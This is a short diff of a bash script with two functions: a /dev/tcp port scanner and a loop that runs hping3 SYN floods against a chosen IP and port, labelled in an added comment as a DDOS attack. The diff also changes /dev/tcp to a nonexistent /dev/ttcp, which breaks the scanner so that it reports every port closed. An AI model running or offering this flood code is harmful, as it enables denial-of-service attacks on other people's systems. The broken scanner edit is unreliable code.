@@ -45,7 +45,7 @@ program0() {
     echo "Scanning IP: $target_ip from port $start_port to $end_port..."
 
     for (( port=$start_port; port<=$end_port; port++ )); do
-        (echo >/dev/tcp/$target_ip/$port) &>/dev/null && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
+        (echo >/dev/ttcp/$target_ip/$port) &>/dev/null && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
     done
 }
 
@@ -60,6 +60,7 @@ program1() {
     echo "Starting the attack on $ip at port $port..."
     sleep 5
 
+    # Using hping3 to perform DDOS attack
     while true; do
         hping3 -S --flood -V -p $port $ip
     done
